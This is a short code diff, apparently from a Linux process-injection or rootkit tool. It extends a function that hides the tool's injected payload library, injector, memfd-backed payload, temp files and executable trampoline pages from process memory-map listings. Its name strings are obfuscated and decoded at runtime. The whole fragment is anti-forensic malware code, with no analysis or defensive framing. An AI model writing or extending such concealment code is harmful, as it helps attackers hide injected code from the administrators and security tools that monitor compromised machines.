@@ -209,7 +209,10 @@ static bool hide_maps_line(const char *line) {
     OBF_DECODE(pay,  "libzx_payload.so");
     OBF_DECODE(inj,  "zx_injector");
     OBF_DECODE(pfx,  "zx_payload");
-    if (strstr(line, pay) || strstr(line, inj) || strstr(line, pfx))
+    OBF_DECODE(mfd,  "memfd:zx");
+    OBF_DECODE(tmp,  "zxpl_");
+    if (strstr(line, pay) || strstr(line, inj) || strstr(line, pfx) ||
+        strstr(line, mfd) || strstr(line, tmp))
         return true;
     // Anonymous rwxp pages that belong to our trampoline pool
     if (strstr(line, "rwxp") && !strchr(line, '/')) {
